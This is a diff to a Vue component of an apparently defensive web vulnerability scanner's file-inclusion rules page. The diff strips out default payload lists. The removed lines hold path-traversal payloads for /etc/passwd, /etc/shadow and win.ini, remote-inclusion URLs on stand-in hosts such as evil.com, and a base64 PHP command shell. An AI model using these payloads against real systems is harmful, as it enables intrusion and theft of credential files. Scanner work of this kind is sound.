@@ -1,5 +1,4 @@
-```vue
-<!-- frontend/scan_system_frontend/src/components/rules/FileInclusionRules.vue -->
+// frontend/scan_system_frontend/src/components/rules/FileInclusionRules.vue
 <template>
   <div class="fileinclusion-rules">
     <h3>文件包含扫描设置</h3>
@@ -43,7 +42,7 @@
           <el-alert
             title="加载本地文件包含规则失败"
             type="error"
-            description="使用默认配置"
+            description="请添加规则"
             :closable="false"
             show-icon
           />
@@ -111,7 +110,7 @@
           <el-alert
             title="加载远程文件包含规则失败"
             type="error"
-            description="使用默认配置"
+            description="请添加规则"
             :closable="false"
             show-icon
           />
@@ -179,7 +178,7 @@
           <el-alert
             title="加载文件包含匹配模式失败"
             type="error"
-            description="使用默认配置"
+            description="请添加规则"
             :closable="false"
             show-icon
           />
@@ -187,7 +186,7 @@
 
         <div v-else class="rules-content">
           <div v-if="!isEditingPatterns" class="patterns-display">
-            <el-descriptions :column="1" border>
+            <el-descriptions :column="1" border v-if="Object.keys(filePatterns).length > 0">
               <el-descriptions-item v-for="(patterns, fileType) in filePatterns" :key="fileType" :label="getFileTypeLabel(fileType)">
                 <div class="pattern-list">
                   <div v-for="(pattern, index) in patterns" :key="index" class="pattern-item">
@@ -283,56 +282,21 @@ export default {
 
           console.log("找到本地文件包含规则:", rule);
         } else {
-          console.log("未找到本地文件包含规则，使用默认值");
-          // 如果没有找到规则，使用默认值
-          this.lfiPayloads = [
-            "../../../etc/passwd",
-            "../../../../etc/passwd",
-            "../../../../../etc/passwd",
-            "../../../../../../etc/passwd",
-            "../../../../../../../etc/passwd",
-            "../../../../../../../../etc/passwd",
-            "../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../../../../etc/passwd",
-            "../../../../../../../../../../../../../../../etc/shadow",
-            "../../../../Windows/win.ini",
-            "../../../../../Windows/win.ini",
-            "../../../../../../Windows/win.ini",
-            "../../../../windows/win.ini",
-            "../../../../../windows/win.ini",
-            "../../../../../../windows/win.ini",
-            "..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%5c..%5c..%5cwindows%5cwin.ini",
-            "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
-          ];
-          this.lfiPayloadsText = this.lfiPayloads.join('\n');
+          console.log("未找到本地文件包含规则");
+          // 初始化为空
+          this.lfiPayloads = [];
+          this.lfiPayloadsText = '';
           this.lfiRuleId = null;
-
-          // 尝试创建默认规则
-          await this.createDefaultLfiRule();
         }
       } catch (error) {
         console.error('获取本地文件包含规则失败', error);
         this.loadLfiFailed = true;
+        
+        // 初始化为空
+        this.lfiPayloads = [];
+        this.lfiPayloadsText = '';
 
-        // 使用默认值
-        this.lfiPayloads = [
-          "../../../etc/passwd",
-          "../../../../etc/passwd",
-          "../../../../../etc/passwd",
-          "../../../../../../../../../../../etc/passwd",
-          "../../../../Windows/win.ini",
-          "../../../../../Windows/win.ini",
-          "..%2F..%2F..%2Fetc%2Fpasswd",
-          "..%5c..%5c..%5cwindows%5cwin.ini"
-        ];
-        this.lfiPayloadsText = this.lfiPayloads.join('\n');
-
-        ElMessage.error('获取本地文件包含规则失败，使用默认配置');
+        ElMessage.error('获取本地文件包含规则失败，请手动添加规则');
       } finally {
         this.isLoadingLfi = false;
       }
@@ -357,37 +321,21 @@ export default {
 
           console.log("找到远程文件包含规则:", rule);
         } else {
-          console.log("未找到远程文件包含规则，使用默认值");
-          // 如果没有找到规则，使用默认值
-          this.rfiPayloads = [
-            "http://evil.com/shell.php",
-            "https://attacker.com/malicious.php",
-            "http://localhost/shell.php",
-            "ftp://evil.com/shell.php",
-            "//evil.com/shell.php",
-            "http://127.0.0.1/shell.php",
-            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
-          ];
-          this.rfiPayloadsText = this.rfiPayloads.join('\n');
+          console.log("未找到远程文件包含规则");
+          // 初始化为空
+          this.rfiPayloads = [];
+          this.rfiPayloadsText = '';
           this.rfiRuleId = null;
-
-          // 尝试创建默认规则
-          await this.createDefaultRfiRule();
         }
       } catch (error) {
         console.error('获取远程文件包含规则失败', error);
         this.loadRfiFailed = true;
+        
+        // 初始化为空
+        this.rfiPayloads = [];
+        this.rfiPayloadsText = '';
 
-        // 使用默认值
-        this.rfiPayloads = [
-          "http://evil.com/shell.php",
-          "https://attacker.com/malicious.php",
-          "http://localhost/shell.php",
-          "//evil.com/shell.php"
-        ];
-        this.rfiPayloadsText = this.rfiPayloads.join('\n');
-
-        ElMessage.error('获取远程文件包含规则失败，使用默认配置');
+        ElMessage.error('获取远程文件包含规则失败，请手动添加规则');
       } finally {
         this.isLoadingRfi = false;
       }
@@ -422,67 +370,21 @@ export default {
 
           console.log("找到文件包含匹配模式规则:", rule);
         } else {
-          console.log("未找到文件包含匹配模式规则，使用默认值");
-          // 如果没有找到规则，使用默认值
-          this.filePatterns = {
-            "linux_etc_passwd": [
-              "root:x:0:0:",
-              "bin:x:",
-              "daemon:x:",
-              "nobody:x:"
-            ],
-            "linux_etc_shadow": [
-              "root:",
-              "daemon:",
-              ":0:99999:"
-            ],
-            "windows_win_ini": [
-              "[fonts]",
-              "[extensions]",
-              "[mci extensions]",
-              "[files]"
-            ],
-            "apache_conf": [
-              "<Directory ",
-              "DocumentRoot",
-              "ServerAdmin"
-            ],
-            "php_info": [
-              "PHP Version",
-              "PHP API",
-              "php.ini"
-            ]
-          };
-          this.filePatternsText = JSON.stringify(this.filePatterns, null, 2);
+          console.log("未找到文件包含匹配模式规则");
+          // 初始化为空
+          this.filePatterns = {};
+          this.filePatternsText = '';
           this.patternsRuleId = null;
-
-          // 尝试创建默认规则
-          await this.createDefaultPatternsRule();
         }
       } catch (error) {
         console.error('获取文件包含匹配模式规则失败', error);
         this.loadPatternsFailed = true;
+        
+        // 初始化为空
+        this.filePatterns = {};
+        this.filePatternsText = '';
 
-        // 使用默认值
-        this.filePatterns = {
-          "linux_etc_passwd": [
-            "root:x:0:0:",
-            "bin:x:",
-            "nobody:x:"
-          ],
-          "windows_win_ini": [
-            "[fonts]",
-            "[extensions]",
-            "[mci extensions]"
-          ],
-          "php_info": [
-            "PHP Version",
-            "php.ini"
-          ]
-        };
-        this.filePatternsText = JSON.stringify(this.filePatterns, null, 2);
-
-        ElMessage.error('获取文件包含匹配模式规则失败，使用默认配置');
+        ElMessage.error('获取文件包含匹配模式规则失败，请手动添加规则');
       } finally {
         this.isLoadingPatterns = false;
       }
@@ -565,93 +467,19 @@ export default {
 
     editMatchPatterns() {
       this.isEditingPatterns = true;
+      
+      // 如果没有内容，提供一个空对象结构作为模板
+      if (!this.filePatternsText) {
+        this.filePatternsText = JSON.stringify({
+          "linux_etc_passwd": [],
+          "windows_win_ini": []
+        }, null, 2);
+      }
     },
 
     cancelEditPatterns() {
       this.isEditingPatterns = false;
       this.filePatternsText = JSON.stringify(this.filePatterns, null, 2);
-    },
-
-    // 创建默认规则方法
-    async createDefaultLfiRule() {
-      try {
-        // 准备规则数据
-        const ruleData = {
-          vuln_type: 'file_inclusion',
-          name: '本地文件包含载荷规则',
-          description: '用于检测本地文件包含(LFI)漏洞的路径遍历载荷',
-          rule_content: JSON.stringify({
-            subType: 'lfi',
-            payloads: this.lfiPayloads
-          })
-        };
-
-        console.log("创建默认本地文件包含规则:", ruleData);
-
-        // 创建规则
-        const response = await rulesAPI.createVulnScanRule(ruleData);
-        console.log("默认本地文件包含规则创建成功:", response);
-        this.lfiRuleId = response.id;
-
-        return response;
-      } catch (error) {
-        console.error('创建默认本地文件包含规则失败', error);
-        return null;
-      }
-    },
-
-    async createDefaultRfiRule() {
-      try {
-        // 准备规则数据
-        const ruleData = {
-          vuln_type: 'file_inclusion',
-          name: '远程文件包含载荷规则',
-          description: '用于检测远程文件包含(RFI)漏洞的URL载荷',
-          rule_content: JSON.stringify({
-            subType: 'rfi',
-            payloads: this.rfiPayloads
-          })
-        };
-
-        console.log("创建默认远程文件包含规则:", ruleData);
-
-        // 创建规则
-        const response = await rulesAPI.createVulnScanRule(ruleData);
-        console.log("默认远程文件包含规则创建成功:", response);
-        this.rfiRuleId = response.id;
-
-        return response;
-      } catch (error) {
-        console.error('创建默认远程文件包含规则失败', error);
-        return null;
-      }
-    },
-
-    async createDefaultPatternsRule() {
-      try {
-        // 准备规则数据
-        const ruleData = {
-          vuln_type: 'file_inclusion',
-          name: '文件包含匹配模式规则',
-          description: '用于检测文件包含成功的匹配模式',
-          rule_content: JSON.stringify({
-            subType: 'patterns',
-            patterns: this.filePatterns
-          })
-        };
-
-        console.log("创建默认文件包含匹配模式规则:", ruleData);
-
-        // 创建规则
-        const response = await rulesAPI.createVulnScanRule(ruleData);
-        console.log("默认文件包含匹配模式规则创建成功:", response);
-        this.patternsRuleId = response.id;
-
-        return response;
-      } catch (error) {
-        console.error('创建默认文件包含匹配模式规则失败', error);
-        return null;
-      }
     },
 
     // 保存方法
@@ -898,4 +726,3 @@ export default {
   margin: 20px 0;
 }
 </style>
-```
